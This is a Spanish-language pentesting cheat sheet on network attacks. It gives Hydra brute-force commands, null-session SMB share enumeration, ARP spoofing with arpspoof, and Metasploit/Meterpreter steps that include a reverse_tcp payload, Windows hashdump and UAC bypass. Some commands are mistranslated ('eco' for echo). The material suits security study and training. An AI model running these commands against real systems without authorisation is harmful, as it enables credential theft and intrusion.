# Network Attacks 
Un ataque a la red es un intento de obtener acceso no autorizado a la red de una organización, con el objetivo de robar datos o realizar otra actividad maliciosa.hace 6 días.

### Seclists

[SecLists](https://github.com/danielmiessler/SecLists) es una gran lista que contiene nombres de usuario comunes, contraseñas, URL, patrones de datos confidenciales, cargas útiles fuzzing, shells web y más.

```
apt-get install seclists
```

### Hydra
Hydra es un cracker de autenticación de red rápido y en paralelo que admite diferentes protocolos.
```
hydra -L <users file> -P <password file> -t 10 <target> ssh -s 22
hydra -L <users file> -P <password file> telnet://<target>
```

### Windows Shares
NetBIOS puede proporcionar parte de la siguiente información al consultar una computadora:
- Nombre de host
- Nombre NetBIOS
- Dominio
- Acciones de red

La explotación de recursos compartidos mal configurados puede conducir a:
- Divulgación de información
- Acceso a archivos no autorizado
- Fuga de información utilizada para montar un ataque objetivo

Los ataques de sesión nula se pueden utilizar para enumerar mucha información. Los atacantes pueden robar información sobre:
- Contraseñas
- Usuarios del sistema
- Grupos de sistemas
- Ejecutar procesos del sistema.
           
```          
# Comando de Windows más común para enumerar recursos compartidos de Windows
nbtstat -A <target>
```      

```
# Una vez que un atacante sabe que una máquina tiene el servicio de servidor de archivos en ejecución, puede enumerar los recursos compartidos usando NET VIEW
NET VIEW <target>
# Esto le dice a Windows que se conecte al recurso compartido IPC$ usando una contraseña y un nombre de usuario vacíos
NET USE \\<target IP address>\IPC$ "" /u:''
```

```
# Estos comandos se pueden usar en una máquina Linux para enumerar recursos compartidos de red
nmblookup -A <target>

# Smbclient puede hacer lo mismo que NET VIEW pero también muestra los recursos compartidos administrativos que están ocultos cuando se usan las herramientas estándar de Windows
smbclient -L //<target> -N (list shares without asking for password)
smbclient //<target>/share -N (mount share)

# enum4linux es un script PERL muy poderoso que se puede usar para enumerar recursos compartidos de Windows
enum4linux -a <target>
```

Por defecto, enum4linux realiza:

- Enumeración de usuarios
- Compartir enumeración
- Enumeración de grupos y miembros
- Extracción de política de contraseñas
- Detección de información del sistema operativo
- Una ejecución de nmblookup
- Extracción de información de la impresora

### ARP Poisoning/Spoofing (Dsniff)
El envenenamiento ARP es un poderoso ataque que puede usar para interceptar el tráfico en una red conmutada.
```
# le dice a mi máquina que reenvíe los paquetes interceptados a los hosts de destino reales
eco 1 > /proc/sys/net/ipv4/ip_forward

# arpspoof -i <interfaz> -t <objetivo> -r <host>
arpspoof -i tap0 -t 10.10.10.10 -r 10.10.10.11

# Ejemplo: para interceptar tráfico entre 192.168.1.5 y 192.168.1.6
eco 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t 192.168.1.5 -r 192.168.1.6
# Luego ejecute Wireshark e intercepte el tráfico
```

### Metasploit
Metasploit es un marco de código abierto utilizado para pruebas de penetración y desarrollo de exploits.

Metasploit le brinda una amplia gama de exploits y vectores de ataque aportados por la comunidad que se pueden usar contra varios sistemas y tecnologías.

Flujo de trabajo básico para explotar un objetivo usando MSFConsole:

- Identificación de un servicio vulnerable
- Búsqueda de un exploit adecuado para ese servicio
- Cargando y configurando el exploit
- Cargando y configurando la carga útil que desea utilizar
- Ejecutar el código de explotación y obtener acceso a la máquina vulnerable

```
# Inicia la consola de metasploit
msfconsole

# Buscar todos los módulos por término
search <término de búsqueda>

# Establecer qué módulo usar
use /path/to/exploit

# Una vez que se está utilizando un módulo para mostrar todas las opciones para configurar
show options

# Use el comando set y el nombre de la configuración para configurar todas las configuraciones
set payload /path/to/payload
set RHOST <remote host>
set RPORT <remote port>

# Para ejecutar/explotar el módulo
run
exploit
```

Las cargas útiles son piezas de código inyectadas por un módulo de explotación en la máquina o el servicio de la víctima.

Un atacante utiliza una carga útil para obtener:

- Un sistema operativo Shell
- Una conexión VNC o RDP
- Un caparazón Meterpreter
- La ejecución de una aplicación proporcionada por el atacante

### Meterpreter
Meterpreter es un shell muy potente que se ejecuta en aplicaciones y servicios vulnerables de Android, BSD, Java, Linux, PHP, Python y Windows.

Meterpreter es más que un simple caparazón. Proporciona funciones avanzadas para recopilar información, transferir archivos entre las máquinas del atacante y la víctima, instalar puertas traseras y más.

Meterpreter le permite recopilar información sobre la máquina explotada y la red a la que está conectado. Puedes recuperar:

- Información sobre la máquina y el sistema operativo
- La configuración de red en uso
- La tabla de enrutamiento del host comprometido
- Información sobre el usuario que ejecuta el proceso explotado

```
# Puede configurar su carga útil para que sea un shell meterpreter antes de ejecutarlo
set payload <windows, linux, java etc>/meterpreter/reverse_tcp

# Una vez que tenga abierta una sesión de meterpreter, puede ponerla en segundo plano o usar Ctrl+z
background

# Use the sessions command to see all current running sessions
sessions
sessions -l

# Use el indicador -i y el número de sesiones para interactuar con él
sessions -i 1

# Comandos de recopilación de información útil una vez en meterpreter shell
sysinfo
ifconfig
route
getuid
getsystem

# El módulo hashdump vuelca la base de datos de contraseñas de una máquina con Windows
use post/windows/gather/hashdump
set session 1
run

# bypassuac es un módulo que puede usar para omitir el control uac en una máquina con Windows
use exploit/windows/local/bypassuac
show options
set session 1
exploit
getuid (now having administrative privileges)

# El comando de shell le brinda un shell de sistema operativo estándar
shell
```
           
